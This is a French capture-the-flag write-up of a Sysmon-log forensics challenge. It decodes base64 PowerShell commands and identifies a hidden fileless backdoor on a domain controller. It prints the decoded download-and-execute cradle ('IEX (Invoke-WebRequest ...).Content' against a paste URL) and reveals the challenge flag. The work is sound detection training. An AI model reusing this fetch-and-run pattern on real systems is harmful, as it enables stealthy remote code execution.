# La backdoor secrète (HacKagou 2026) — Forensic

**Flag :** `OPENNC{L3v14th4n_v41ncr4}`
**Valeur :** 50 pts · **Auteur :** K3rhu0n · **Statut :** ✅ résolu

## Énoncé

> Depuis la remise en route partielle du Nautile, NÉRÉIDE détecte une activité anormale dans les systèmes de la chaufferie.
> Les journaux de supervision montrent des centaines d'exécutions courantes liées aux opérations du bord. Il semblerait toutefois qu'une exécution suspecte distante soit lancée, alors qu'aucun fichier malveillant n'a été détecté.
>
> **Mission :** trouve le message secret.
> **Format du flag :** `OPENNC{...}` — **Auteur :** `K3rhu0n`

Fichier fourni : [`sysmon.log`](../sysmon.log) (130 Ko, 420 événements **Sysmon EventID 1** = créations de processus).

Points clés de l'énoncé : *exécution distante* + *aucun fichier malveillant détecté* → il faut chercher une exécution **fileless** (payload exécuté en mémoire, rien écrit sur disque).

## Reconnaissance

Le log est un flot homogène de créations de processus PowerShell. La grande majorité est du recon d'administration tout à fait légitime (`Get-Volume`, `Get-CimInstance`, `Get-Service`, exécutions de `C:\Scripts\maintenance.ps1`…), destiné à noyer l'événement malveillant.

Répartition des événements et tri des commandes encodées :

```bash
grep -oE 'EventID=[0-9]+' sysmon.log | sort | uniq -c
#   420 EventID=1
```

Les éléments les plus intéressants d'un point de vue forensic sont les **10 commandes `-EncodedCommand`** (base64 en **UTF-16LE**, l'encodage attendu par le paramètre PowerShell). On les décode toutes d'un coup :

```python
import re, base64
for i, l in enumerate(open('sysmon.log', encoding='utf-8', errors='replace'), 1):
    m = re.search(r'-EncodedCommand\s+([A-Za-z0-9+/=]+)', l)
    if m:
        dec = base64.b64decode(m.group(1)).decode('utf-16-le')
        print(f'L{i}: {dec}')
```

Résultat :

| Ligne | Hôte | Commande décodée |
|---|---|---|
| L34 | NAUTILE-OPS01 | `Get-Service | Where-Object {$_.Status -eq 'Running'}` |
| L71 | NAUTILE-CTRL01 | `Get-CimInstance Win32_OperatingSystem | Select Caption,Version` |
| L109 | NAUTILE-CTRL01 | `Get-ChildItem 'C:\Logs' -Filter *.log | Sort LastWriteTime -Desc` |
| L148 | NAUTILE-ENG01 | `Get-NetTCPConnection | Where {$_.State -eq 'Listen'}` |
| L193 | NAUTILE-OPS01 | `Get-FileHash 'C:\Scripts\maintenance.ps1' -Algorithm SHA256` |
| L226 | NAUTILE-OPS01 | `Get-ScheduledTask | Where {$_.State -eq 'Ready'}` |
| **L287** | **ABYSSEA-DC01** | **`IEX (Invoke-WebRequest "https://www.paste.org/paste/raw/132100").Content`** |
| L314 | NAUTILE-OPS01 | `Get-Process | Sort WorkingSet -Desc | Select -First 15` |
| L361 | NAUTILE-CTRL01 | `Test-NetConnection 10.10.20.15 -Port 443` |
| L402 | NAUTILE-CTRL01 | `Get-WinEvent -LogName System -MaxEvents 50` |

Neuf lignes sur dix sont du recon anodin. **Une seule** correspond au scénario décrit.

## Exploitation

L'événement malveillant est la **ligne 287** :

```
2026-09-27T18:33:22.000Z EventID=1 Computer=ABYSSEA-DC01 User=ABYSSEA\admin.ops
ProcessId=9649 ParentProcessId=1886 ParentImage=C:\Windows\explorer.exe
CommandLine="powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <...>"
```

Décodée :

```powershell
IEX (Invoke-WebRequest "https://www.paste.org/paste/raw/132100").Content
```

C'est la backdoor : `Invoke-WebRequest` récupère un script distant et `IEX` (`Invoke-Expression`) l'exécute **directement en mémoire** — d'où l'absence de fichier malveillant sur disque. Les indicateurs s'accumulent : commande encodée pour masquer l'intention, `-WindowStyle Hidden`, parent `explorer.exe`, et exécution sur le contrôleur de domaine `ABYSSEA-DC01`.

Le « message secret » est le contenu servi par l'URL. On le récupère (lecture de données, on n'exécute évidemment pas le script) :

```bash
curl -sL "https://www.paste.org/paste/raw/132100"
# Write-Host "Bravo tu as le flag : OPENNC{L3v14th4n_v41ncr4}"
```

## Flag

```
OPENNC{L3v14th4n_v41ncr4}
```
